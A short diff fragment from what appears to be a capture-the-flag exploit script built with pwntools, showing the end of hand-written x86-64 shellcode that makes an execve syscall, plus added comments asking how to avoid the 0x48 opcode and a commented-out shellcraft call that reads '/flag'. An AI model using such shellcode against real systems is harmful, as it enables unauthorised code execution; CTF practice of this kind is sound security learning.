@@ -36,6 +36,8 @@ push 0x3b
 pop rax
 syscall
 """
+# both not working, how to prevent 48 opcode in 64 bit mode? 
+#shellcode=pwnlib.shellcraft.i386.linux.cat("/flag")
 #shellcode=pwnlib.shellcraft.i386.linux.sh()
 shellcode=(asm(shellcode))
 
